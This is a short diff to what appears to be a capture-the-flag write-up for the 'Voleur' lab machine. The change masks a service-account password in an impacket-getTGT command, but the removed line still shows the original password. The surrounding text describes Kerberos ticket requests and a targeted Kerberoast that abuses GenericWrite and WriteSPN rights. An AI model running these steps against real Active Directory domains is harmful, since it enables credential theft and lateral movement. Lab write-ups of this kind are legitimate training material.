@@ -96,7 +96,7 @@ Re-authentication: A new TGT is obtained for svc_ldap.
 
 Bash
 ```
-impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
+impacket-getTGT voleur.htb/'svc_ldap':'M1XXXXX7qT5Vn'
 export KRB5CCNAME=/home/kali/Voleur/svc_ldap.ccache
 ```
 Targeted Kerberoast: It is discovered that svc_ldap has GenericWrite permission on lacey.miller and WriteSPN on svc_winrm. The targetedKerberoast.py script is executed to request service tickets.
